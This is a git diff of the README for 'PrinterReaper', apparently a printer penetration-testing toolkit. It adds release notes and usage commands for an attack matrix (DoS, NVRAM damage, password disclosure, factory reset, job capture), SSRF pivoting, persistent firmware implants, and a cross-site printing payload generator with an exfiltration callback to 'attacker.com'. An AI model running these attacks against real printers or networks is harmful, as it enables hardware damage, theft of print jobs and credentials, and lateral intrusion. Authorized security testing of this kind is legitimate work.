@@ -1,4 +1,4 @@
-# PrinterReaper v3.1.0 - *Complete Printer Penetration Testing Toolkit*
+# PrinterReaper v3.3.0 - *Complete Printer Penetration Testing Toolkit*
 
 **Is your printer safe from the void? Find out before someone else does…**
 
@@ -9,6 +9,22 @@ PrinterReaper v3.0.0 is the **most complete printer penetration testing toolkit*
 > **Official Website**: [www.uniaogeek.com.br/printer-reaper](https://www.uniaogeek.com.br/printer-reaper/)
 
 ---
+
+## What's New in v3.3.0
+
+- **`--attack-matrix`** — full structured attack campaign covering every category from Müller et al. 2017 BlackHat paper + 2024-2025 CVEs: DoS (PS infinite loop, showpage redef, PJL offline, NVRAM damage, CVE-2024-51982), Protection Bypass (PJL password, PML DMCMD reset, PS exitserver, SNMP reset), Print Job Manipulation (overlay, capture+retention, list), Information Disclosure (memory, filesystem, credential, CORS spoofing, SNMP MIB)
+- **`--network-map`** — complete network map from printer's perspective: SNMP routing/ARP, PJL network vars, web config scraping, full /24 subnet TCP scan, WSD neighbor discovery, attack path generation
+- **`--xsp ATTACK_TYPE`** — Cross-Site Printing (XSP) + CORS spoofing payload generator; creates HTML+JS payloads that make a victim's browser attack internal printers without same-origin policy restrictions; types: info, capture, dos, nvram, exfil
+- **NVD API key** — now using real NVD API key for more accurate CVE lookups
+- **`protocols/network_map.py`** — new module: SNMP network info, PJL network var extraction, web scraping for IPs/MACs, subnet scanner with 60 threads, WSD discovery, attack path analysis
+- **`core/attack_orchestrator.py`** — new module: structured campaign runner mapping every cell of the printer attack matrix with per-attack `AttackResult` and `CampaignReport`
+
+## What's New in v3.2.0
+
+- **IPP attack suite** — `protocols/ipp_attacks.py`: endpoint discovery, anonymous job, queue purge, attr manipulation, printer sleep, physical ID (LED flash)
+- **SSRF lateral movement** — `protocols/ssrf_pivot.py`: IPP Print-URI SSRF, WSD SOAP SSRF, timing-based port scan, internal host discovery
+- **Storage access** — `protocols/storage.py`: FTP (list/download/upload), web enumeration, SNMP MIB dump, saved job retrieval
+- **Firmware** — `protocols/firmware.py`: version extraction, upload check, custom payloads (PJL/PS/PCL/ESC/P-R/PWG-Raster), NVRAM read/write, factory reset, persistent config implant
 
 ## What's New in v3.1.0
 
@@ -33,6 +49,8 @@ PrinterReaper v3.0.0 is the **most complete printer penetration testing toolkit*
 
 | Version | Date       | Highlights |
 |---------|------------|------------|
+| 3.3.0   | 2026-03-24 | Attack matrix, network map, XSP/CORS spoofing, NVD key, attack orchestrator |
+| 3.2.0   | 2026-03-24 | IPP attacks, SSRF pivot, storage, firmware, persistent implants |
 | 3.1.0   | 2026-03-24 | --scan recon, CVE scanner, ML engine, config.yaml, Shodan integration |
 | 3.0.0   | 2026-03-24 | IPv6, SMB complete, pysnmp v5/v7, IPP/TLS, local discovery, 63 QA tests |
 | 2.5.3   | 2025-10-05 | PRET assets, overlay commands, discovery flags, clean repo |
@@ -41,6 +59,79 @@ PrinterReaper v3.0.0 is the **most complete printer penetration testing toolkit*
 - **🧪 Test Fixtures** - Real PS/PCL test pages for QA validation
 
 ---
+
+## Attack Matrix (Full Campaign — BlackHat 2017 + 2024-2025)
+
+```bash
+# Run all attack categories (dry-run — probe only, no exploitation)
+python src/main.py 192.168.1.10 --attack-matrix
+
+# Live exploit mode (AUTHORIZED LABS ONLY — destructive)
+python src/main.py 192.168.1.10 --attack-matrix --no-dry
+
+# Attack matrix + network map in one pass
+python src/main.py 192.168.1.10 --attack-matrix --network-map
+```
+
+Categories covered by `--attack-matrix`:
+
+| Category | Attack | Protocol | Reference |
+|----------|--------|----------|-----------|
+| DoS | PS infinite loop `{} loop` | PS/RAW | Müller 2017 |
+| DoS | showpage redefinition | PS/exitserver | Müller 2017 |
+| DoS | Offline mode | PJL | Müller 2017 |
+| DoS | Physical NVRAM damage | PJL DEFAULT | Müller 2017 |
+| DoS | FORMLINES crash | PJL | CVE-2024-51982 |
+| DoS | IPP queue purge | IPP 0x0012 | RFC 8011 |
+| ProtBypass | Password disclosure | PJL INFO VARIABLES | Müller 2017 |
+| ProtBypass | Factory reset (HP) | PML DMCMD | Müller 2017 |
+| ProtBypass | PS exitserver | PostScript | Müller 2017 |
+| ProtBypass | SNMP write reset | SNMP SET | Generic |
+| JobManip | Page overlay | PS showpage redef | Advisory 1/6 |
+| JobManip | Job capture start | PS exitserver+filter | Advisory 1/6 |
+| JobManip | Captured job list | PS capturedict | Advisory 1/6 |
+| InfoDisc | PJL memory access | PJL DMINFO | Müller 2017 |
+| InfoDisc | Filesystem listing | PS filenameforall | Müller 2017 |
+| InfoDisc | Credential files | PS/PJL path traversal | Müller 2017 |
+| InfoDisc | CORS spoofing | PS + HTTP headers | XSP research |
+| InfoDisc | SNMP MIB dump | SNMP walk | Generic |
+| Network | WSD SSRF pivot | IPP/WSD | Custom |
+
+## Network Mapping from Printer Perspective
+
+```bash
+# Map everything reachable from the printer's network segment
+python src/main.py 192.168.1.10 --network-map
+```
+
+Output includes:
+- SNMP routing table, ARP cache, interface list
+- PJL network variables (IP, gateway, DNS, WINS, NTP)
+- Web config page scraping (IPs, MACs, gateway)
+- Full /24 subnet scan (60 threads, 18 key ports)
+- WSD device discovery
+- Attack paths per discovered host
+
+## Cross-Site Printing (XSP) + CORS Spoofing
+
+```bash
+# Generate XSP payload — printer info disclosure via victim browser
+python src/main.py 192.168.1.10 --xsp info
+
+# Generate job capture malware (embedded in web page)
+python src/main.py 192.168.1.10 --xsp capture
+
+# Generate DoS payload for web attacker model
+python src/main.py 192.168.1.10 --xsp dos
+
+# With exfil callback URL
+python src/main.py 192.168.1.10 --xsp exfil --xsp-callback https://attacker.com/recv
+```
+
+XSP payloads create HTML+JavaScript files in `.log/` that:
+1. Use `XMLHttpRequest` to send PostScript to port 9100 via victim's browser
+2. Use CORS spoofing to bypass same-origin policy and READ printer responses
+3. Can capture/exfiltrate print jobs without physical access
 
 ## Reconnaissance (passive — no payloads sent)
 
